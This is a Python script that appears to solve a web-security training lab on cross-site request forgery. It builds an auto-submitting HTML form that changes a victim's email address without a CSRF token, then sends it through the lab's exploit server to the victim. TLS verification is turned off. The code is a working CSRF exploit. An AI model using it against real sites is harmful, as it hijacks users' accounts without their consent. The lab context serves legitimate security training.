import requests
import re
import urllib3
from colorama import Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "CSRF where token validation depends on token being present"

def post_data(url, data):
    try:
        return requests.post(url, data=data, verify=False)
    except Exception as e:
        print(f"[!] Failed to post data: {e}")
        return None


def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Craft an HTML form for changing the email address with an auto-submit script and doesn't include the csrf token in the form\n2. Deliver the exploit to the victim\n3. The victim's email will be changed after they trigger the exploit\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Ask for exploit server URL
        exploit_server = input(
            "[?] Enter the exploit server URL: ").strip().rstrip('/')

        url=url.rstrip('/')
        # Step 2: Build and deliver exploit
        new_email = "mystic_mido@mystic_mido.com"
        payload = f"""<html>
                    <body>
                    <form action="{url}/my-account/change-email" method="POST">
                        <input type="hidden" name="email" value="{new_email}" />
                        <input type="submit" value="Submit request" />
                    </form>
                    <script>
                        document.forms[0].submit();
                    </script>
                    </body>
                </html>"""

        exploit_data = {
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": payload,
            "formAction": "DELIVER_TO_VICTIM",
            "urlIsHttps": "on",
            "responseFile": "/exploit"
        }

        res = post_data(exploit_server + "/", exploit_data)
        if res and res.status_code == 200:
            print("[+] Exploit delivered successfully!")
            return True
        else:
            print("[-] Exploit delivery failed.")
            return False

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return False
